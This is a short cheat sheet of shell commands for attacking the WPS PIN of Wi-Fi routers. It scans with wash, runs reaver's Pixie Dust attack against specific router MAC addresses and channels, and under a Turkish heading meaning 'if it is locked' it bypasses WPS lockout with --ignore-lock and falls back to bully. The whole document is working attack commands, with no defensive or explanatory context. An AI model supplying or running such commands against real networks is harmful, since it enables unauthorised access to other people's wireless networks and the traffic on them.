
wash -i wlan0

reaver -i wlan0 -b C8:54:4B:04:55:C9 -c 6 -K 1 -vv --no-nacks -d 5


### EĞER KİLİTLİYSE:
reaver -i wlan0 -b 2C:70:4F:60:CF:A2 -c 4 -K 1 -vv --no-nacks -d 5 --ignore-lock

bully -b 2C:70:4F:60:CF:A2 -c 4 -d --nofcs wlan0

